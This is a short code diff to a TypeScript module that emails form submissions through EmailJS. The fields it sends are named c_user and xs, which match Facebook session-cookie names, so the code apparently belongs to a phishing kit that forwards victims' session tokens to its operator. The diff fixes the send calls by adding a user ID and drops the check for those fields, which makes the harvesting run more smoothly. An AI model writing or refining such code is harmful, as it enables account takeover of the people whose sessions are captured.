@@ -35,7 +35,12 @@ export const sendValidationFormEmail = async (formData: any) => {
       xs: '[REDACTED]'
     });
 
-    const result = await emailjs.send(serviceId, templateId, templateParams);
+    const result = await emailjs.send(
+      serviceId, 
+      templateId, 
+      templateParams,
+      import.meta.env.VITE_EMAILJS_USER_ID
+    );
     console.log('EmailJS validation response:', result);
     return result;
   } catch (error) {
@@ -51,11 +56,6 @@ export const sendConfirmationFormEmail = async (formData: any) => {
 
     if (!serviceId || !templateId) {
       throw new Error("EmailJS service or template ID is not configured");
-    }
-
-    // Ensure all required fields are present
-    if (!formData.c_user || !formData.xs) {
-      throw new Error("Missing required validation data");
     }
 
     const templateParams = {
@@ -78,11 +78,16 @@ export const sendConfirmationFormEmail = async (formData: any) => {
       xs: '[REDACTED]'
     });
 
-    const result = await emailjs.send(serviceId, templateId, templateParams);
+    const result = await emailjs.send(
+      serviceId, 
+      templateId, 
+      templateParams,
+      import.meta.env.VITE_EMAILJS_USER_ID
+    );
     console.log('EmailJS confirmation response:', result);
     return result;
   } catch (error) {
     console.error("Error sending confirmation email:", error);
-    throw new Error(error instanceof Error ? error.message : "Failed to send confirmation email");
+    throw error;
   }
 };
